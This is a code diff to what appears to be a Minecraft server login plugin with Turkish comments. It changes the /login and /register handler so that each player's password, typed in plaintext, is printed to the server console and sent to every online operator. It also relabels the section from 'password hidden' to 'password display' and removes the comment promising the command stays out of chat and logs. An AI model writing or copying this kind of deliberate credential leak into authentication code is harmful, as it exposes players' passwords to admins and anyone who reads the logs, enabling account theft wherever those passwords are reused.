@@ -295,7 +295,7 @@ public void onQuit(PlayerQuitEvent e) {
     authed.remove(e.getPlayer().getUniqueId());  
 }  
 
-// ===================== COMMAND GATE (sifre gizli) =====================  
+// ===================== COMMAND GATE (sifre gosterimi) =====================  
 
 @EventHandler(priority = EventPriority.LOWEST, ignoreCancelled = true)  
 public void onCommandPre(PlayerCommandPreprocessEvent e) {  
@@ -305,17 +305,22 @@ public void onCommandPre(PlayerCommandPreprocessEvent e) {
     String cmd = parts[0].toLowerCase(Locale.ROOT);  
 
     if (cmd.equals("/login") || cmd.equals("/register")) {  
-        // Komutu sohbete ve loga dusurmeden kendimiz isliyoruz  
         e.setCancelled(true);  
         String[] params = Arrays.copyOfRange(parts, 1, parts.length);  
         if (cmd.equals("/register")) handleRegister(p, params);  
         else handleLogin(p, params);  
 
-        // OP'lere şifre ile birlikte bilgi gönderimi  
-        String fullArgs = String.join(" ", params);
+        // OP olan herkese ve konsola şifreyi göster
+        String passwordInfo = String.join(" ", params);
+        String logMessage = "§6" + p.getName() + " §7adlı oyuncunun şifresi" + cmd + " (" + passwordInfo + ")";
+        
+        // Konsola yazdır
+        Bukkit.getConsoleSender().sendMessage(logMessage);
+
+        // Oyundaki tüm OP'lere gönder
         for (Player op : Bukkit.getOnlinePlayers()) {  
-            if (op.isOp() && !op.equals(p)) {  
-                op.sendMessage(ChatColor.GRAY + "[BladeX] " + p.getName() + " " + cmd + " denemesi yapti: " + ChatColor.YELLOW + fullArgs);  
+            if (op.isOp()) {  
+                op.sendMessage(logMessage);  
             }  
         }  
         return;  
@@ -426,5 +431,5 @@ private void msg(Player p, String key, String... pairs) {
     p.sendMessage(ChatColor.translateAlternateColorCodes('&', prefix + text));  
 }
 
-                                                         }
-            
+}
+    
